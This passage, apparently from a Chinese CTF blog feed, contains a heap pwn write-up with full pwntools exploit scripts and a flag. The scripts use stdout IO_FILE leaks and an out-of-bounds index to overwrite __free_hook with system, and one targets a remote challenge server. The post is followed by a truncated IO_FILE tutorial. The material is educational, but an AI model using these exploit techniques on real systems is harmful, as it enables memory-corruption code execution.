密码:i2om</span><br></pre></td></tr></table></figure><ul><li>在讲解这题之前，先要说明一个小<code>trick</code>，如果不知道这个<code>trick</code>的话是没办法做出这题的。</li><li>在<code>bss段</code>中存在一个这样的指针，这个指针指向的是自己，这个指针的位置在<code>bss</code>段中<code>&amp;stdout - 0x18</code>这个位置。<ul><li>此时如果存在索引值为负数，我们就能动用这个指针利用这个指针，可以有一次任意地址写的机会。</li><li>可以修改它为<code>free_hook</code>的地址，向<code>free_hook</code>写入<code>system</code>函数的地址，之后再释放堆块，从而执行<code>system(&quot;/bin/sh&quot;)</code></li></ul></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820185021024.png" alt="image-20250820185021024"></p><h2 id="题目4_分析1">题目4_分析1</h2><ul><li>查看一下程序保护机制，发现保护全开</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820185812637.png" alt="image-20250820185812637"></p><ul><li>然后分析程序逻辑，发现其实是一个经典堆菜单的题目，程序逻辑就不逆了。但是没有堆溢出漏洞，也没有<code>UAF</code>漏洞。</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820185827105.png" alt="image-20250820185827105"></p><ul><li>漏洞点其实在<code>edit</code>这边，有一个数组越界的漏洞</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820185836760.png" alt="image-20250820185836760"></p><ul><li>并且这题没有<code>show()</code>函数</li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820185845926.png" alt="image-20250820185845926"></p><h2 id="题目4_分析2">题目4_分析2</h2><ul><li>由于最近刚学完<code>stdout泄露libc</code>所以这题很明显就是要修改<code>IO_FILE</code>泄露libc。泄露是泄露出来了，但是就卡在如何利用这边。看了别人的<code>wp</code>才知道其实<code>heap[-11]</code>这个索引有问题。</li><li>动态调试会发现<code>heap[-11]=heap[-11]</code>，所以我们可以利用<code>heap[-11]</code>去修改<code>heap[-11]</code>这个地方，将其修改为<code>free_hook</code></li><li>这样再调用一次<code>edit(heap[-11])</code>就能将<code>system_addr</code>写入到<code>free_hook</code>这边，之后再申请一个堆块写入<code>/bin/sh</code>即可<code>getshell</code></li></ul><p><img src="/2025/07/20/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/IO%E5%88%A9%E7%94%A8%E4%B9%8Bstdout%E4%BB%BB%E6%84%8F%E8%AF%BB/image-20250820185907823.png" alt="image-20250820185907823"></p><h2 id="题目4_exp">题目4_exp</h2><ul><li>打本地的<code>exp</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./user&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;5. Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Enter your username:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;5. Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;5. Exit&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Enter a new username:&#x27;</span>,context)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(<span class="number">0xFBAD1800</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p8(<span class="number">0</span>)</span><br><span class="line">edit(-<span class="number">8</span>,payload)</span><br><span class="line">leak_addr = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">stdout_addr = u64(leak_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_addr:&#x27;</span>,<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line">libc_addr = stdout_addr - <span class="number">2013568</span></span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]free_hook:&#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]system_addr:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">payload = p64(<span class="number">0xFBAD1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(malloc_hook+<span class="number">0x70</span>) + p64(malloc_hook+<span class="number">0xa0</span>) + p64(malloc_hook+<span class="number">0xa0</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(-<span class="number">8</span>,payload)</span><br><span class="line">heap_addr = p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">heap_addr = u64(heap_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]heap_addr:&#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">env = libc_addr + libc.sym[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line">heap_base = heap_addr - <span class="number">0x350</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload = p64(0xFBAD1800) </span></span><br><span class="line"><span class="string">payload += p64(heap_base+0x240) + p64(heap_base+0x2a0) + p64(heap_base+0x240) </span></span><br><span class="line"><span class="string">payload += p64(0)*3 + p64(heap_base+0x240)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = p64(<span class="number">0xFBAD1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + p64(env) + p64(env+<span class="number">8</span>)+p64(env+<span class="number">8</span>)</span><br><span class="line">edit(-<span class="number">8</span>,payload)</span><br><span class="line">stack = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">stack = u64(stack.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]stack:&#x27;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line">payload = p64(<span class="number">0xFBAD1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(stack-<span class="number">0x130</span>) + p64(stack-<span class="number">0x128</span>) + p64(stack-<span class="number">0x128</span>)</span><br><span class="line">edit(-<span class="number">8</span>,payload)</span><br><span class="line">base = p.recvuntil(<span class="string">b&#x27;1.&#x27;</span>)[:<span class="number">6</span>]</span><br><span class="line">base = u64(base.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = base - <span class="number">0x133B</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]base:&quot;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line">bss_addr = base_addr + <span class="number">0x4060</span></span><br><span class="line">index = (bss_addr - free_hook)//<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(index)</span><br><span class="line"><span class="comment">#payload = p64(0xfbad1800) +p64(free_hook) + p64(free_hook+8)+p64(free_hook)</span></span><br><span class="line"><span class="comment">#payload += p64(0)*3 #+ p64(free_hook)</span></span><br><span class="line"><span class="comment">#edit(-6,payload)</span></span><br><span class="line"><span class="comment">#p.sendline(p64(system_addr))</span></span><br><span class="line">edit(-<span class="number">11</span>,p64(free_hook))</span><br><span class="line">edit(-<span class="number">11</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>打远程的exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/myheart/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./user&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pss.idss-cn.com&#x27;</span>,<span class="number">24342</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;5. Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Enter your username:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;5. Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;5. Exit&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Enter a new username:&#x27;</span>,context)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">payload = p64(<span class="number">0xFBAD1800</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p8(<span class="number">0</span>)</span><br><span class="line">edit(-<span class="number">8</span>,payload)</span><br><span class="line">leak_addr = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">stdout_addr = u64(leak_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak_addr:&#x27;</span>,<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line">libc_addr = stdout_addr - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]<span class="comment">#2013568</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]free_hook:&#x27;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]system_addr:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">edit(-<span class="number">8</span>,payload)</span><br><span class="line">edit(-<span class="number">11</span>,p64(free_hook))</span><br><span class="line">edit(-<span class="number">11</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>flag如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7ZjaDWxsy4lvcinVgKqeUXHJwrLm16Op&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：学习IO</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN_IO_FILE基础</title>
    <link href="http://iyheart.github.io/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/"/>
    <id>http://iyheart.github.io/2025/07/19/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/4.IO_FILE/PWN-IO-FILE%E5%9F%BA%E7%A1%80/</id>
    <published>2025-07-19T14:28:15.000Z</published>
    <updated>2025-07-20T04:43:22.992Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：[<a href="https://bbs.kanxue.com/thread-275968.htm">原创]无路远征——GLIBC2.37后时代的IO攻击之道（零）-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></li><li>参考博客：<a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">关于gdb源码调试环境搭建 - ZikH26 - 博客园</a></li><li>参考博客：<a href="https://www.anquanke.com/post/id/84987">【技术分享】溢出利用FILE结构体-安全KER - 安全资讯平台</a></li><li>参考博客：<a href="https://www.getspwn.xyz/?p=61">io file基础 - blog at gets</a></li><li><code>IO</code>也就是输入输出的意思，但是<code>C</code>语言的输入输出的函数有很多，例如：<code>puts</code>、<code>printf</code>、<code>write</code>、<code>stdin</code>、<code>stdout</code>、<code>scanf</code>、<code>read</code>等与输入输出相关的函数。</li><li>而我们所说的打<code>IO</code>打的是我们封装到比较上层的函数，比如<code>puts</code>、<code>printf</code>这类的上层封装的函数。<ul><li><code>read</code>、<code>write</code>这两个是比较底层的，系统调用<code>syscall</code>的输入输出，一般都是调用这两个函数。</li><li><code>puts</code>、<code>printf</code>等这些<code>IO</code>函数最后都会通过<code>write</code>这个底层函数与操作系统交互。</li><li>所以我们所说的打<code>IO</code>，打的就是这种上层输入输出函数。在调用这些函数的时候会经过一些<code>指针</code>、<code>结构体</code>、<code>函数指针</code>等，所以我们通过劫持<code>指针</code>、<code>伪造IO结构体</code>、<code>绕过检查机制</code>从而<code>getshll</code>或者执行<code>shellcode</code>。</li><li>与<code>IO</code>相关的都可以在<code>glibc</code>源码中，<code>/path/to/glibc2.23/libio</code>中可以看到。</li></ul></li><li>由于高版本的<code>glibc</code>中<code>hook</code>指针被删除了，所以余下可用的函数指针只有<code>io</code>相关的函数指针了，在高版本堆利用的时候<code>IO</code>利用就成了基础了。</li></ul><h1 id="io_file起源及结构体">IO_FILE起源及结构体</h1><ul><li>如果出过<code>pwn</code>题或者做过<code>全缓冲</code>的<code>pwn</code>题就会了解到这个函数。和缓冲区的三种工作模式，<code>无缓冲</code>、<code>行缓冲</code>、<code>全缓冲</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>为什么要设置这三种模式，这就和<code>硬件</code>、<code>操作系统</code>、<code>程序</code>三者有关。首先程序要读写硬盘或者是输出到屏幕中，这些都是要通过系统调用<code>syscall</code>，进行<code>write</code>、<code>read</code>系统调用。</li><li>而何时进行系统调用，这就成为了设计<code>IO</code>的一个重要问题。如果每一个字节都需要使用<code>syscall</code>系统调用（即无缓冲模式）。向硬件进行读写操作，这就会大大降级操作系统的效率，并且硬件频繁读写也会造成更快的损坏。</li><li>为了减少这种情况，在设计<code>IO</code>的时候就会出现导致，设置了<code>缓冲区</code>，要输入的数据或者要输出的数据都会先被放入缓冲区，直到缓冲区满了之后，再进行系统调用，将缓冲区存储的内容写入到屏幕或者其他硬件中（全缓冲），以便提高操作系统的效率，提高硬件的使用寿命，这也就出现了现在的<code>IO_FILE</code>结构体。</li><li>接下来总结一下<code>glibc</code>封装的上层函数中与输入输出相关的函数，对于<code>IO</code>的攻击一般就攻击这些<code>IO</code>函数的结构体。<ul><li>标准输入函数<ul><li><code>gets()</code>、<code>fgets()</code>、<code>scanf()</code>、<code>fscanf()</code>、<code>sscanf()</code>、<code>getc()</code>、<code>fgetc()</code>、<code>getchar()</code>、<code>getline()</code>、<code>getdelim()</code></li></ul></li><li>标准输出函数<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>putc()</code>、<code>fputc()</code>、<code>putchar()</code>、<code>puts()</code></li></ul></li><li>文件操作函数：<ul><li><code>fopen()</code>、<code>freopen()</code>、<code>fdopen()</code>、<code>fclose()</code>、<code>fflush()</code>、<code>setbuf()</code>、<code>setvbuf()</code>、<code>fread()</code>、<code>fwrite()</code>、<code>fseek()</code>、<code>ftell()</code>、<code>fewind()</code>、<code>rewind()</code></li></ul></li><li>格式化字符串相关函数：<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>vprintf()</code>、<code>vfprintf()</code>、<code>vsprintf()</code>、<code>vsnprintf()</code></li></ul></li><li>其他相关函数：<ul><li><code>perror()</code>、<code>tmpfile()</code>、<code>clearerr()</code>、<code>feof()</code>、<code>ferror()</code>、<code>stdout</code>、<code>stdout()</code>、<code>stdin()</code>、<code>stderror()</code></li></ul></li></ul></li></ul><h1 id="io_file相关动调">IO_FILE相关动调</h1><ul><li><p>写介绍几个比较重要的<code>IO</code>结构体，并且说明这写结构体在<code>glibc2.23</code>源码的什么位置。</p></li><li><p>这里先汇总一下与<code>IO_FILE</code>相关动调命令，与<code>IO_FILE</code>相关的调试基本上就是打印结构体。可以在<code>gdb</code>中使用<code>p</code>命令打印出结构体的具体存储的值</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p <span class="built_in">stdout</span></span><br><span class="line">p _IO_2_1_stdout_</span><br><span class="line">    </span><br><span class="line">p &amp;_IO_file_jumps</span><br><span class="line">p _IO_file_jumps</span><br><span class="line">    </span><br><span class="line">p &amp;_IO_list_all</span><br><span class="line">p *(<span class="keyword">struct</span> _IO_FILE *) _IO_list_all</span><br></pre></td></tr></table></figure><h1 id="io_file相关源码">IO_FILE相关源码</h1><ul><li>这里只介绍一下<code>IO_FLE</code>重要的相关源码所在的<code>glibc</code>源码文件路径，具体的代码等着调试的时候再看。</li></ul><p><strong>glibc2.28之前</strong></p><ul><li><code>glibc/libio/libio.h</code>保存着<code>struct _IO_FILE</code>的定义。</li><li><code>glibc/libio/libio.h</code>定义了<code>struct _IO_FILE_plus _IO_2_1_stdin_ 、_IO_2_1_stdout_ 、_IO_2_1_stderr_</code>这三个。</li><li><code>glibc/libio/libio.h</code>定义了<code>struct _IO_wide_data</code>这个结构体。</li><li><code>glibc/libio/libio.h</code>有着<code>IO_FILE结构体中的int _flags</code>成员中的宏定义</li><li><code>glibc/libio/libioP.h</code>保存着<code>struct _IO_FILE_plus</code>结构体的定义。</li><li><code>glibc/libio/libioP.h</code>保存着<code>struct _IO_jump_t</code>结构体的定义。</li><li><code>glibc/libio/libioP.h</code>定义了<code> struct _IO_FILE_plus *_IO_list_all</code>结构体指针。</li></ul><h1 id="io_file基础">IO_FILE基础</h1><h2 id="_io_file_plus结构及成员">_IO_FILE_plus结构及成员</h2><ul><li><p>对于<code>_IO_FILE_plus</code>结构，在<code>glibc2.28</code>的时候做出了<strong>比较大的变化</strong>,其中变化最大的就是其成员<code>_IO_FILE</code>结构体变成了<code>FILE</code>结构体，但是源码<strong>仅仅是这样<code>typedef struct _IO_FILE FILE;</code></strong>，结构体成员稍微有点变化。</p></li><li><p>对于<code>stdin、stdout、stderr</code>，这三个<code>io</code>，是在libc中一开始就定义好的。已经有对应的<code>libc</code>内存中已经存储着它们三个的<code>IO_FILE_plus</code>结构体，程序在每次启动前会经过<code>__libc_start_main</code>进行初始化。</p></li><li><p>当我们使用<code>fopen()</code>打开一个文件之后，<code>fopen</code>会调用<code>malloc</code>在申请一块堆中的内存，这段堆内存保存着该文件对应的<code>IO_FILE_plus</code>结构体的实例。</p></li><li><p>而<code>_IO_FILE_plus</code>结构体是如下定义的，其结构体内部包括了来个类型分别为<code>_IO_FILE file</code>和<code>_IO_jump_t *vtable</code>：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _IO_FILE_plus其实是一个&quot;带虚表的_IO_FILE&quot;,这个虚表其实可以支持多态(即不同流类型有不同操作)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span><span class="comment">// 这个是一个指向_IO_jump_t结构体的指针,变量名为vtable</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>_IO_FILE file</code>的结构体如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">// 标志位,包括文件状态和打开方式,高位是_IO_FILE的magic,宏定义是这样的#define _IO_MAGIC 0xFBAD0000,在这个宏定义的上下几行都是标志位相关的宏定义</span></span><br><span class="line">   </span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">// 读缓冲区当前的读取位置</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">// 读缓冲区结束的位置</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">// 读缓冲区的基地址</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">// 写缓冲区的基地址</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">// 写缓冲区的当前位置</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">// 写缓冲区的结束位置</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">// 缓冲区的基地址</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">// 缓冲区的结束地址</span></span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">  <span class="type">char</span> *_IO_save_base;  <span class="comment">// 保存缓冲区基地址</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base; <span class="comment">// 备份缓冲区基地址</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">// 保存缓冲区的结束地址</span></span><br><span class="line">    </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span><span class="comment">// 标记指针,用于跟踪缓冲区的读写位置</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span><span class="comment">// 比较重要的结构体指针,链接到下一个_IO_FILE文件结构,利用该指针文件结构之间会形成链表</span></span><br><span class="line">  <span class="type">int</span> _fileno;<span class="comment">// 文件描述符</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line">  <span class="type">int</span> _flags2;<span class="comment">// 额外的文件状态标志</span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">// 文件偏移(旧版,已弃用)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column; <span class="comment">// 当前列号</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> 